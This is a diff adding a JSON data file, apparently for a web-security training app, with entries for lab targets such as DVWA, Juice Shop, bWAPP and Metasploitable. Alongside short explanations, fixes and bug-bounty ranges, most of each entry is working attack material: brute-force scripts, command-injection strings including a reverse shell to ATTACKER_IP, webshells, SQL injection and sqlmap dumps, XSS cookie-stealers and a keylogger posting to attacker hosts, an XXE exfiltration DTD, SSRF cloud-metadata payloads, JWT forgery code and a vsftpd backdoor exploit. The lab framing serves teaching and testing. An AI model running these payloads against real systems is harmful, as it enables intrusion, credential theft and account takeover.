@@ -1,0 +1,232 @@
+{
+  "dvwa-001": {
+    "what": "Password guessing attack using automated tools against a login form with no rate limiting or lockout policy.",
+    "why": "No rate limiting + predictable usernames = unlimited brute force. Credential stuffing also applies here.",
+    "detect": ["Response time differences between valid/invalid users", "Burp Intruder with Sniper/Cluster Bomb mode", "Error message patterns (username vs password errors reveal valid users)", "Monitor for 401/403 floods in server logs"],
+    "docker_cmd": "docker run --rm -d -p 4280:80 --name dvwa vulnerables/web-dvwa\n# Visit http://localhost:4280 → Login: admin/password → Set Security: LOW → Go Brute Force",
+    "payloads": [
+      { "label": "Hydra HTTP POST", "code": "hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 4280 http-post-form \"/login.php:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.\"" },
+      { "label": "Python Brute Force", "code": "import requests\nsession = requests.Session()\nwith open('/usr/share/wordlists/rockyou.txt', encoding='latin-1') as f:\n    for pwd in f:\n        pwd = pwd.strip()\n        data = {'username': 'admin', 'password': pwd, 'Login': 'Login'}\n        cookies = {'security': 'low', 'PHPSESSID': 'YOUR_TOKEN'}\n        r = session.get('http://localhost:4280/vulnerabilities/brute/', params=data, cookies=cookies)\n        if 'Welcome' in r.text:\n            print(f'[+] CRACKED: {pwd}')\n            break" },
+      { "label": "Burp Intruder Setup", "code": "GET /vulnerabilities/brute/?username=admin&password=§PASSWORD§&Login=Login HTTP/1.1\nCookie: security=low; PHPSESSID=YOURTOKEN\n# Set payload position on §PASSWORD§, use Sniper with wordlist" },
+      { "label": "Medusa", "code": "medusa -h localhost -n 4280 -u admin -P rockyou.txt -M http -m DIR:/vulnerabilities/brute/" }
+    ],
+    "fixes": ["Account lockout after 5 failed attempts", "CAPTCHA after 3rd failed attempt", "Rate limiting: max 10 login attempts per minute per IP", "Two-factor authentication (2FA)", "Use strong passwords + bcrypt hashing"],
+    "bounty": "$500–$5,000 | Common in: corporate login portals, admin panels | Report as: 'No brute-force protection on login endpoint'"
+  },
+  "dvwa-002": {
+    "what": "OS command injection lets an attacker execute arbitrary system commands by injecting metacharacters into vulnerable input fields.",
+    "why": "App passes user input directly to shell functions (system(), exec(), shell_exec()) without sanitization.",
+    "detect": ["Try ; id, && whoami, | uname -a as input", "Time-based blind: ; sleep 5", "Out-of-band: ; nslookup attacker.com", "Burp Active Scanner"],
+    "docker_cmd": "docker run --rm -d -p 4280:80 --name dvwa vulnerables/web-dvwa\n# Visit → Security LOW → Command Injection module\n# Input field: 127.0.0.1",
+    "payloads": [
+      { "label": "Basic Injection Operators", "code": "127.0.0.1; id\n127.0.0.1 && cat /etc/passwd\n127.0.0.1 | whoami\n127.0.0.1 || uname -a\n127.0.0.1`id`" },
+      { "label": "Blind - Time Based", "code": "127.0.0.1; sleep 5\n127.0.0.1 & timeout /t 5" },
+      { "label": "Reverse Shell", "code": "127.0.0.1; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n\n# Listener on attacker:\nnc -lvnp 4444" },
+      { "label": "Filter Bypass (Medium Level)", "code": "# DVWA medium blocks && and ;\n# Use: | or newline\n127.0.0.1|id\n127.0.0.1%0aid" }
+    ],
+    "fixes": ["Never pass user input to shell functions", "Use parameterized system calls", "Whitelist valid input (IP regex validation)", "Run web server with minimum required OS privileges", "Disable dangerous PHP functions: system, exec, shell_exec"],
+    "bounty": "$2,000–$20,000 | Critical if server compromise | Report as: 'OS Command Injection in [feature]'"
+  },
+  "dvwa-003": {
+    "what": "Cross-Site Request Forgery tricks an authenticated user's browser into sending unintended state-changing requests to a trusted site.",
+    "why": "Server trusts cookies automatically sent by browser; lacks unpredictable token verification for state-changing requests.",
+    "detect": ["Find state-changing requests (password change, fund transfer)", "Check if any anti-CSRF token exists", "Test: remove Referer header, submit cross-origin", "Burp: Generate CSRF PoC"],
+    "docker_cmd": "docker run --rm -d -p 4280:80 --name dvwa vulnerables/web-dvwa\n# Security LOW → CSRF module\n# Observe the Change Password form — no token!",
+    "payloads": [
+      { "label": "HTML Auto-Submit CSRF Form", "code": "<html>\n<body onload=\"document.forms[0].submit()\">\n  <form action=\"http://localhost:4280/vulnerabilities/csrf/\" method=\"GET\">\n    <input type=\"hidden\" name=\"password_new\" value=\"hacked\" />\n    <input type=\"hidden\" name=\"password_conf\" value=\"hacked\" />\n    <input type=\"hidden\" name=\"Change\" value=\"Change\" />\n  </form>\n</body>\n</html>" },
+      { "label": "IMG Tag CSRF (GET request)", "code": "<img src=\"http://localhost:4280/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change\" width=\"0\" height=\"0\" />" },
+      { "label": "Fetch CSRF", "code": "fetch('http://localhost:4280/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change', {\n  credentials: 'include'\n});" },
+      { "label": "JSON CSRF Bypass", "code": "<form method=\"POST\" action=\"https://target.com/api/change-email\" enctype=\"text/plain\">\n  <input name='{\"email\":\"attacker@evil.com\", \"x\":\"' value='\"}' />\n</form>" }
+    ],
+    "fixes": ["Implement CSRF tokens (Synchronizer Token Pattern)", "Use SameSite=Strict or SameSite=Lax cookie attribute", "Verify Origin and Referer headers", "Require re-authentication for critical actions"],
+    "bounty": "$500–$10,000 | High if admin action | Report as: 'CSRF on [critical function] allows account takeover'"
+  },
+  "dvwa-004": {
+    "what": "File Inclusion allows an attacker to include and execute arbitrary local (LFI) or remote (RFI) files through vulnerable include() calls.",
+    "why": "PHP include/require functions take user-controlled input without sanitization or path restriction.",
+    "detect": ["Look for ?page=, ?file=, ?include= parameters", "Try: ?page=../../../../etc/passwd", "PHP wrappers: php://filter/convert.base64-encode/resource=index.php"],
+    "docker_cmd": "docker run --rm -d -p 4280:80 --name dvwa vulnerables/web-dvwa\n# Security LOW → File Inclusion module",
+    "payloads": [
+      { "label": "LFI - Read /etc/passwd", "code": "?page=../../../../etc/passwd\n?page=....//....//....//etc/passwd\n?page=..%252f..%252f..%252fetc%252fpasswd" },
+      { "label": "PHP Wrappers", "code": "# Read source code base64 encoded:\n?page=php://filter/convert.base64-encode/resource=../config.php\n\n# Execute arbitrary PHP:\n?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+" },
+      { "label": "Log Poisoning → RCE", "code": "# Step 1: Inject PHP into User-Agent\ncurl -H \"User-Agent: <?php system(\\$_GET['cmd']); ?>\" http://localhost:4280/\n\n# Step 2: Include access log\n?page=../../../../var/log/apache2/access.log&cmd=id" },
+      { "label": "RFI (Remote File Inclusion)", "code": "echo '<?php system($_GET[\"c\"]); ?>' > evil.php\npython3 -m http.server 8888\n\n# Include remotely:\n?page=http://ATTACKER_IP:8888/evil.php&c=id" }
+    ],
+    "fixes": ["Never pass user input to include/require", "Whitelist allowed file names", "Set open_basedir in php.ini", "Disable allow_url_include and allow_url_fopen"],
+    "bounty": "$1,000–$15,000 | RFI = Critical (RCE) | LFI = High (data leak)"
+  },
+  "dvwa-005": {
+    "what": "Unrestricted file upload allows attackers to upload malicious scripts (webshells) disguised as legitimate files, leading to RCE.",
+    "why": "Server trusts user-supplied filename/content-type without proper validation of actual file content.",
+    "detect": ["Upload a PHP file — if it executes, instant RCE", "Change Content-Type to image/jpeg while keeping .php extension", "Try double extensions: shell.php.jpg"],
+    "docker_cmd": "docker run --rm -d -p 4280:80 --name dvwa vulnerables/web-dvwa\n# Security LOW → File Upload module",
+    "payloads": [
+      { "label": "Simple PHP Webshell", "code": "# Create shell.php:\n<?php system($_GET['cmd']); ?>\n\n# Upload it, then access:\nhttp://localhost:4280/hackable/uploads/shell.php?cmd=id" },
+      { "label": "MIME Type Bypass", "code": "# Intercept upload in Burp, change Content-Type:\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"shell.php\"\nContent-Type: image/jpeg\n\n<?php system($_GET['cmd']); ?>" },
+      { "label": "Extension Bypass", "code": "shell.php5\nshell.phtml\nshell.pHp\nshell.php.jpg\nshell.php%00.jpg" },
+      { "label": "GIF Header Bypass", "code": "GIF89a <?php system($_GET['cmd']); ?>\n# Save as: shell.gif — bypasses magic byte check!" }
+    ],
+    "fixes": ["Validate file type using MIME detection (fileinfo)", "Store uploads outside webroot", "Rename files to random strings on server", "Disable PHP execution in upload directory"],
+    "bounty": "$3,000–$25,000 | Critical = instant RCE | Report as: 'Unrestricted file upload allows remote code execution'"
+  },
+  "dvwa-006": {
+    "what": "SQL injection allows manipulating database queries by injecting malicious SQL code through user input fields.",
+    "why": "Application builds SQL queries by string concatenation with unsanitized user input.",
+    "detect": ["Single quote ' causes error", "Try: 1' OR '1'='1 for auth bypass", "SQLmap: sqlmap -u 'URL?id=1' --dbs"],
+    "docker_cmd": "docker run --rm -d -p 4280:80 --name dvwa vulnerables/web-dvwa\n# Security LOW → SQL Injection module",
+    "payloads": [
+      { "label": "Error-based Detection", "code": "'\n1'\n1' AND 1=1--\n1' AND 1=2--" },
+      { "label": "UNION-based Data Extraction", "code": "# Find column count:\n1' ORDER BY 1--\n1' ORDER BY 3-- (error = 2 columns)\n\n# Extract data:\n' UNION SELECT user(),database()--\n' UNION SELECT user,password FROM users--" },
+      { "label": "SQLmap Automated", "code": "sqlmap -u 'http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low;PHPSESSID=XYZ' --dbs\n\nsqlmap -u 'http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low;PHPSESSID=XYZ' -D dvwa -T users --dump" },
+      { "label": "Authentication Bypass", "code": "Username: admin'--\nUsername: ' OR 1=1--\nPassword: anything" }
+    ],
+    "fixes": ["Use prepared statements / parameterized queries", "Use ORM frameworks", "Principle of least privilege for DB users", "Error messages should not expose SQL/DB info"],
+    "bounty": "$1,000–$20,000 | Critical if DB dump or auth bypass"
+  },
+  "dvwa-007": {
+    "what": "Blind SQL injection where no data is returned directly — attackers infer data through boolean or time differences.",
+    "why": "Application is vulnerable to SQLi but suppresses error messages and doesn't echo query results.",
+    "detect": ["1' AND 1=1-- vs 1' AND 1=2-- → different responses (boolean)", "1' AND SLEEP(5)-- → 5 second delay (time-based)"],
+    "docker_cmd": "docker run --rm -d -p 4280:80 --name dvwa vulnerables/web-dvwa\n# Security MEDIUM → SQL Injection (Blind)",
+    "payloads": [
+      { "label": "Boolean-based Blind", "code": "# Character extraction:\n1' AND SUBSTRING(user(),1,1)='r'--\n1' AND ASCII(SUBSTRING(user(),1,1))>100--\n\n# Python automation:\nimport requests\ncookies = {'security': 'medium', 'PHPSESSID': 'TOKEN'}\nresult = ''\nfor pos in range(1, 50):\n    for char in range(32, 127):\n        payload = f\"1 AND ASCII(SUBSTRING(user(),{pos},1))={char}-- -\"\n        r = requests.get(f'http://localhost:4280/vulnerabilities/sqli_blind/?id={payload}&Submit=Submit', cookies=cookies)\n        if 'User ID exists' in r.text:\n            result += chr(char)\n            break\nprint('User:', result)" },
+      { "label": "Time-based Blind", "code": "1' AND SLEEP(5)--\n\n# Extract data:\n1' AND IF(SUBSTRING(user(),1,1)='r',SLEEP(5),0)--\n\nsqlmap -u 'URL' --technique=T --dbs" },
+      { "label": "Out-of-Band SQLi", "code": "# Requires MySQL FILE privilege:\n1' AND LOAD_FILE(CONCAT(0x5c5c,user(),0x2e,database(),0x2eattacker,0x2ecom5c))--" }
+    ],
+    "fixes": ["Prepared statements (prevents all SQLi)", "Database user should NOT have FILE privilege", "WAF for time-based patterns"],
+    "bounty": "$2,000–$20,000 | Report as: 'Blind SQL Injection in [parameter]'"
+  },
+  "dvwa-008": {
+    "what": "Reflected XSS injects JavaScript through URL parameters that are reflected unsanitized in the server's HTML response.",
+    "why": "User input is directly included in page output without HTML encoding/escaping.",
+    "detect": ["Submit: <script>alert(1)</script> in all inputs", "Try event handlers: <img src=x onerror=alert(1)>", "Check if < > ' \" are encoded in HTML source"],
+    "docker_cmd": "docker run --rm -d -p 4280:80 --name dvwa vulnerables/web-dvwa\n# Security LOW → XSS (Reflected)",
+    "payloads": [
+      { "label": "Basic XSS Payloads", "code": "<script>alert(document.cookie)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>" },
+      { "label": "Cookie Stealing", "code": "<script>fetch('http://ATTACKER_IP:8888/steal?c='+document.cookie)</script>\n\n# Listener:\npython3 -m http.server 8888" },
+      { "label": "Filter Bypass", "code": "<ScRiPt>alert(1)</ScRiPt>\n<input autofocus onfocus=alert(1)>\n<a href=javascript:alert(1)>click me</a>" },
+      { "label": "Keylogger", "code": "<script>\ndocument.addEventListener('keydown', function(e){\n  fetch('http://ATTACKER:8888/key?k='+e.key);\n});\n</script>" }
+    ],
+    "fixes": ["HTML-encode all output: < > \" ' &", "Content Security Policy (CSP) header", "HttpOnly flag on cookies", "X-XSS-Protection: 1; mode=block header"],
+    "bounty": "$500–$7,500 | Reflected + auth cookie = account takeover"
+  },
+  "dvwa-009": {
+    "what": "Stored (Persistent) XSS saves malicious scripts to the database, executing them for ALL users who view the page.",
+    "why": "User-supplied data stored in DB is rendered back in HTML without sanitization — affects every visitor.",
+    "detect": ["Post comment with <script>alert(1)</script>", "Check if it persists after reload", "Look for rich text areas, profile fields, comments, chat"],
+    "docker_cmd": "docker run --rm -d -p 4280:80 --name dvwa vulnerables/web-dvwa\n# Security LOW → XSS (Stored) → Guestbook",
+    "payloads": [
+      { "label": "Persistent Cookie Stealer", "code": "# Post as comment:\n<script>new Image().src='http://ATTACKER:8888/?cookie='+document.cookie;</script>\n# Every user who views sends their cookie!" },
+      { "label": "BeEF Hook", "code": "<script src='http://ATTACKER:3000/hook.js'></script>\n# Hooks all viewers' browsers to BeEF C2" },
+      { "label": "Redirect All Users", "code": "<script>window.location='http://attacker.com/phishing'</script>" },
+      { "label": "Bypass maxlength via Burp", "code": "# Intercept form submit, change 'message' to full payload:\nmessage=<script>alert(document.cookie)</script>&txtName=test&btnSign=Sign+Guestbook" }
+    ],
+    "fixes": ["HTML-encode ALL user input before storing AND before rendering", "Content Security Policy", "Strip/sanitize HTML tags (use DOMPurify)", "Review every data storage point"],
+    "bounty": "$1,000–$15,000 | Stored > Reflected | Wormable XSS = Critical"
+  },
+  "dvwa-010": {
+    "what": "DOM-based XSS occurs entirely in client-side JavaScript — attacker data flows from DOM sources (URL, hash) to dangerous sinks (innerHTML, eval) without hitting the server.",
+    "why": "JavaScript reads from location.href/hash/document.URL and writes to innerHTML without sanitization.",
+    "detect": ["Check JS for: location.hash, location.search, document.URL", "Find sinks: innerHTML, document.write, eval", "DOM Invader (Burp Suite extension)"],
+    "docker_cmd": "docker run --rm -d -p 4280:80 --name dvwa vulnerables/web-dvwa\n# Security LOW → XSS (DOM)\n# URL: http://localhost:4280/vulnerabilities/xss_d/?default=English",
+    "payloads": [
+      { "label": "Hash-based DOM XSS", "code": "http://localhost:4280/vulnerabilities/xss_d/#<script>alert(1)</script>\nhttp://localhost:4280/vulnerabilities/xss_d/#<img src=x onerror=alert(1)>" },
+      { "label": "Query Parameter DOM XSS", "code": "http://localhost:4280/vulnerabilities/xss_d/?default=</option></select><img src=x onerror=alert(1)>" },
+      { "label": "JavaScript Protocol URI", "code": "javascript:alert(document.cookie)\n# Inject in href, src, action attributes" }
+    ],
+    "fixes": ["Never use innerHTML — use textContent instead", "Sanitize via DOMPurify.sanitize()", "CSP with strict-dynamic", "Avoid eval(), setTimeout(string)"],
+    "bounty": "$500–$10,000 | DOM XSS often bypasses WAF | Report as: 'DOM XSS via [source] to [sink]'"
+  },
+  "juice-001": {
+    "what": "SQL injection in login endpoint allows bypassing authentication entirely to login as any user including admin.",
+    "why": "Login query built by string concatenation: SELECT * FROM Users WHERE email='INPUT' AND password='INPUT'",
+    "detect": ["Try email: ' OR 1=1-- in email field", "Error message reveals SQL database type", "Burp to intercept login POST and inject into JSON body"],
+    "docker_cmd": "docker run --rm -d -p 3001:3000 --name juiceshop bkimminich/juice-shop\n# Visit http://localhost:3001 → Go to Login page",
+    "payloads": [
+      { "label": "SQLi Authentication Bypass", "code": "# Email field:\nadmin@juice-sh.op'--\n' OR 1=1--\n\n# JSON body via Burp:\n{\"email\":\"' OR 1=1--\",\"password\":\"anything\"}" },
+      { "label": "SQLi via REST API", "code": "curl -X POST http://localhost:3001/api/Users/login \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"email\":\"' OR 1=1--\",\"password\":\"x\"}'" },
+      { "label": "SQLmap on JSON endpoint", "code": "sqlmap -u 'http://localhost:3001/rest/user/login' \\\n  --data='{\"email\":\"*\",\"password\":\"x\"}' \\\n  --method=POST \\\n  --headers='Content-Type: application/json' \\\n  --dbs --level=5 --risk=3" }
+    ],
+    "fixes": ["Parameterized queries / prepared statements", "Use ORM with query builders", "Validate email format before DB query"],
+    "bounty": "$1,500–$10,000 | Admin bypass = Critical"
+  },
+  "juice-004": {
+    "what": "Insecure Direct Object Reference (IDOR) — accessing another user's resources by manipulating object identifiers in API calls.",
+    "why": "Server authorizes based on authentication (logged in?) but not authorization (is this YOUR resource?).",
+    "detect": ["Find numeric IDs in API paths: /api/baskets/1", "Change your ID to another user's ID", "Burp Intruder: enumerate IDs"],
+    "docker_cmd": "docker run --rm -d -p 3001:3000 --name juiceshop bkimminich/juice-shop\n# Login → Add items to basket → Capture API call",
+    "payloads": [
+      { "label": "IDOR Basket Access", "code": "# Your basket, change to another user's:\ncurl -H 'Authorization: Bearer YOUR_TOKEN' \\\n  http://localhost:3001/rest/basket/1\n  \n# Try incrementing IDs: 1,2,3,4,5..." },
+      { "label": "Python IDOR Scanner", "code": "import requests\ntoken = 'YOUR_JWT_TOKEN'\nfor basket_id in range(1, 100):\n    r = requests.get(f'http://localhost:3001/rest/basket/{basket_id}', \n                     headers={'Authorization': f'Bearer {token}'})\n    if r.status_code == 200 and r.json().get('data'):\n        print(f'[+] Found basket {basket_id}: {r.json()}')" }
+    ],
+    "fixes": ["Authorization check: verify resource.userId == current user's ID", "Use UUIDs instead of sequential integers", "Implement row-level security"],
+    "bounty": "$500–$10,000 | PII exposure = High | Report as: 'IDOR in [endpoint] exposes other users data'"
+  },
+  "juice-007": {
+    "what": "JWT (JSON Web Token) manipulation exploits weak algorithm acceptance or improper signature verification to forge tokens.",
+    "why": "Server accepts alg:none (no signature needed) or accepts HS256 with RSA public key as secret.",
+    "detect": ["Decode JWT at jwt.io — check alg header", "Try alg:none attack", "Check if server exposes public key at /jwks.json"],
+    "docker_cmd": "docker run --rm -d -p 3001:3000 --name juiceshop bkimminich/juice-shop\n# Login normally → capture JWT token in response",
+    "payloads": [
+      { "label": "Algorithm None Attack", "code": "import base64, json\n\ntoken = 'YOUR_TOKEN'\nparts = token.split('.')\n\nnew_header = base64.b64encode(json.dumps({\"alg\":\"none\",\"typ\":\"JWT\"}).encode()).decode().rstrip('=')\nnew_payload = base64.b64encode(json.dumps({\"id\":1,\"email\":\"admin@juice-sh.op\",\"role\":\"admin\"}).encode()).decode().rstrip('=')\nforged = f\"{new_header}.{new_payload}.\"\nprint(forged)" },
+      { "label": "JWT Tool", "code": "# pip install jwt_tool\npython3 jwt_tool.py YOUR_TOKEN -X a  # alg:none\npython3 jwt_tool.py YOUR_TOKEN -T -I -pc role -pv admin" },
+      { "label": "HS256 Key Confusion", "code": "import jwt\npublic_key = open('pubkey.pem').read()\nforged = jwt.encode({'id': 1, 'role': 'admin'}, public_key, algorithm='HS256')" }
+    ],
+    "fixes": ["Explicitly whitelist accepted algorithms (never accept 'none')", "Validate 'kid' header strictly", "Set JWT expiry to short windows"],
+    "bounty": "$2,000–$15,000 | Admin takeover = Critical"
+  },
+  "bwapp-007": {
+    "what": "XML External Entity (XXE) injection exploits XML parsers that process external entity references, enabling file reads, SSRF, and DoS.",
+    "why": "XML parser has external entity processing enabled (default ON) and processes DTD from user-supplied XML.",
+    "detect": ["Find XML inputs: SOAP, REST with XML, SVG/DOCX upload", "Submit DOCTYPE with SYSTEM entity", "Use Burp Collaborator for blind XXE"],
+    "docker_cmd": "docker run --rm -d -p 8081:80 --name bwapp raesene/bwapp\n# Visit http://localhost:8081 / init: yes\n# → XML External Entity (XXE) module",
+    "payloads": [
+      { "label": "Basic XXE File Read", "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>" },
+      { "label": "XXE SSRF", "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">\n]>\n<root>&xxe;</root>" },
+      { "label": "Blind XXE via DNS", "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY % remote SYSTEM \"http://ATTACKER.com/evil.dtd\">\n  %remote;\n]>\n<root>&exfil;</root>\n\n# evil.dtd:\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % wrap \"<!ENTITY exfil SYSTEM 'http://ATTACKER.com/?data=%file;'>\">\n%wrap;" },
+      { "label": "SVG XXE", "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM \"file:///etc/hostname\">\n]>\n<svg xmlns=\"http://www.w3.org/2000/svg\">\n  <text>&xxe;</text>\n</svg>" }
+    ],
+    "fixes": ["Disable DTD processing in XML parser", "Use JSON instead of XML where possible", "WAF rules for DTD/ENTITY patterns"],
+    "bounty": "$3,000–$25,000 | File read = Critical | Report as: 'XXE allows reading internal files and SSRF'"
+  },
+  "ps-004": {
+    "what": "Server-Side Request Forgery (SSRF) tricks the server into making HTTP requests to internal/external resources on behalf of the attacker.",
+    "why": "Application fetches user-supplied URLs without validation — attacker can reach cloud metadata, internal APIs.",
+    "detect": ["Find: URL preview, webhook, PDF export, image fetch", "Try: http://localhost, http://127.0.0.1, http://169.254.169.254", "Use Burp Collaborator for blind SSRF"],
+    "docker_cmd": "# PortSwigger SSRF labs:\n# https://portswigger.net/web-security/ssrf\n# WebGoat SSRF module:\ndocker run --rm -d -p 8082:8080 webgoat/webgoat",
+    "payloads": [
+      { "label": "Cloud Metadata SSRF", "code": "# AWS EC2:\nhttp://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n# GCP:\nhttp://metadata.google.internal/computeMetadata/v1/" },
+      { "label": "Localhost Port Scan", "code": "http://127.0.0.1:22\nhttp://127.0.0.1:3306\nhttp://127.0.0.1:6379\nhttp://127.0.0.1:9200\n\nimport requests, time\nfor port in [22,80,443,3306,6379,8080,9200,27017]:\n    start = time.time()\n    r = requests.get(f'http://TARGET.com/fetch?url=http://127.0.0.1:{port}')\n    if time.time()-start > 1 or 'error' not in r.text.lower():\n        print(f'[OPEN] {port}')" },
+      { "label": "SSRF Bypass Techniques", "code": "http://0177.0.0.1       # Octal\nhttp://0x7f.0.0.1      # Hex\nhttp://2130706433      # Decimal\nhttp://127.1           # Short form\nfile:///etc/passwd" },
+      { "label": "SSRF via Gopher (Redis RCE)", "code": "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a" }
+    ],
+    "fixes": ["Whitelist allowed domains/IPs for outbound requests", "Block private IP ranges: 10.0.0.0/8, 172.16.0.0/12, 169.254.0.0/16", "Use IMDSv2 (requires PUT first for AWS)", "Validate URL schema (only HTTP/HTTPS)"],
+    "bounty": "$1,000–$30,000 | Cloud metadata = Critical | Report as: 'SSRF reads AWS metadata credentials'"
+  },
+  "meta-001": {
+    "what": "The vsftpd 2.3.4 package contains a backdoor — root shell opens on port 6200 when ':)' is appended to the FTP username.",
+    "why": "Malicious code was inserted into vsftpd source code — classic supply chain attack.",
+    "detect": ["Nmap: nmap -sV TARGET — shows vsftpd 2.3.4", "Metasploit: search vsftpd", "Manual: telnet TARGET 21 → send user smiley → check port 6200"],
+    "docker_cmd": "docker run --rm -d -p 21:21 -p 6200:6200 --name meta tleemcjr/metasploitable2",
+    "payloads": [
+      { "label": "Metasploit Exploit", "code": "msfconsole\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS TARGET_IP\nrun\n# → root shell!" },
+      { "label": "Manual Exploitation", "code": "# Trigger backdoor via FTP:\nnc TARGET_IP 21\nUSER backdoored:)\nPASS anything\n\n# Connect backdoor shell:\nnc TARGET_IP 6200\nid  # uid=0(root)" },
+      { "label": "Python Exploit", "code": "import socket, time\nip = 'TARGET_IP'\ns = socket.socket()\ns.connect((ip, 21))\ns.recv(1024)\ns.send(b'USER hackme:)\\r\\n')\ntime.sleep(1)\ns.send(b'PASS x\\r\\n')\ntime.sleep(1)\ns.close()\n\nshell = socket.socket()\nshell.connect((ip, 6200))\nshell.send(b'id\\n')\nprint(shell.recv(1024).decode())" }
+    ],
+    "fixes": ["Update vsftpd to v3.x", "Verify package checksums before deployment", "Network segmentation — FTP not internet-facing", "Monitor for unexpected port 6200 connections"],
+    "bounty": "N/A (training) | Real supply chain CVEs: $10K–$50K"
+  },
+  "ps-015": {
+    "what": "JWT attacks exploit weak algorithm choices, key confusion, header injection (jku/kid) to forge arbitrary tokens.",
+    "why": "Libraries accepting multiple algorithms, improper key validation, or trusting user-controlled JWK/JKU parameters.",
+    "detect": ["Decode JWT at jwt.io — analyze header claims", "Check jku/x5u headers", "Try kid: '../../../dev/null'", "Test alg:none"],
+    "docker_cmd": "# PortSwigger JWT labs:\n# https://portswigger.net/web-security/jwt\n# WebGoat JWT module:\ndocker run --rm -d -p 8082:8080 webgoat/webgoat",
+    "payloads": [
+      { "label": "jku Header Injection", "code": "# Host your own JWKS JSON:\n{\"keys\": [{\"kty\": \"RSA\", \"kid\": \"hacker-key\", \"n\": \"YOUR_RSA_N\", \"e\": \"AQAB\"}]}\n\n# Modify JWT header:\n{\"alg\": \"RS256\", \"jku\": \"https://ATTACKER.com/jwks.json\", \"kid\": \"hacker-key\"}\n# Sign with your private key → server fetches YOUR JWKS!" },
+      { "label": "kid Path Traversal", "code": "# If kid used as file path:\n{\"alg\": \"HS256\", \"kid\": \"../../../../dev/null\"}\n# /dev/null = empty = sign with empty string\nimport jwt\nforged = jwt.encode({'admin': True}, '', algorithm='HS256', headers={'kid': '../../../../dev/null'})" },
+      { "label": "Embedded JWK Attack", "code": "# Add your own public key in JWK header:\n{\"alg\": \"RS256\", \"jwk\": {\"kty\": \"RSA\", \"n\": \"YOUR_PUBLIC_KEY_N\", \"e\": \"AQAB\"}}\n# Sign with matching private key → server uses your embedded key!" }
+    ],
+    "fixes": ["Ignore jku/x5u or strictly whitelist allowed key servers", "Validate kid against static list, never use as file path", "Whitelist algorithm — never accept 'none'"],
+    "bounty": "$3,000–$20,000 | Admin impersonation = Critical"
+  }
+}
